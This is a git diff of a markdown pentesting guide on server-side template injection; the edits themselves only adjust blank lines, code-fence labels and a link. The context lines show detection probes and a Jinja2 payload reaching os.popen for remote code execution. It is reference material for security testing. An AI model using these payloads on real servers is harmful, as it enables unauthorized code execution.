@@ -27,6 +27,7 @@ The simplest initial approach is to try fuzzing the template by injecting a sequ
 $\{\{<%[%'"\}\}%\
 <%=foo%>
 ```
+
 > **Note**: If an exception is raised, this indicates that the injected template syntax is potentially being interpreted by the server in some way.
 
 ### Plaintext context
@@ -52,6 +53,7 @@ engine.render("Hello \{\{"+greeting+"\}\}", data)
 
 http://vulnerable-website.com/?greeting=data.username
 ```
+
 1. First step is to establish that the parameter doesn't contain a direct XSS by injecting arbitrary HTML tags.
 
 ```
@@ -201,7 +203,7 @@ Flask is a framework for web applications written in Python and developed from t
 
 ### Syntax SSTI
 
-```python
+```
 \{\{7*7\}\}
 \{\{ varname \}\}
 
@@ -211,7 +213,7 @@ Flask is a framework for web applications written in Python and developed from t
 
 ### RCE (Remote Code Execution)
 
-```python
+```
 <div data-gb-custom-block data-tag="for"><div data-gb-custom-block data-tag="if" data-0='warning'>\{\{x()._module.__builtins__['__import__']('os').popen("touch /tmp/RCE.txt").read()\}\}</div></div>
 ```
 
@@ -221,4 +223,4 @@ To bypass some restrictions take a look at the following resources:
 
 * [https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
 * [https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
-* h[ttps://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
+* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
